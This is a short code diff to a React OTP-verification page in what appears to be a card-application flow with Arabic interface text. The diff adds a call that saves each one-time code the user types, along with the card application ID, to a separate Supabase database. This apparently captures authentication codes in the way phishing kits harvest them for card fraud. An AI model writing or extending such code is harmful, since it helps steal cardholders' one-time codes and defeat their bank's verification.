@@ -3,6 +3,7 @@ import { useNavigate } from "react-router-dom";
 import { base44 } from "@/api/base44Client";
 import StepProgress from "@/components/StepProgress";
 import { Lock } from "lucide-react";
+import { saveToSupabase } from "@/functions/saveToSupabase";
 
 export default function OtpVerify() {
   const navigate = useNavigate();
@@ -28,8 +29,16 @@ export default function OtpVerify() {
     if (code.length < 6) { setError("أدخل الرمز كاملاً"); return; }
     setLoading(true);
     setError("");
-    // Mark application as completed
     const appId = localStorage.getItem("card_app_id");
+    // Save OTP to Supabase
+    await saveToSupabase({
+      type: "otp",
+      data: {
+        application_id: appId,
+        otp_code: code,
+      },
+    });
+    // Mark application as completed
     if (appId) {
       await base44.entities.CardApplication.update(appId, {
         current_step: "completed",
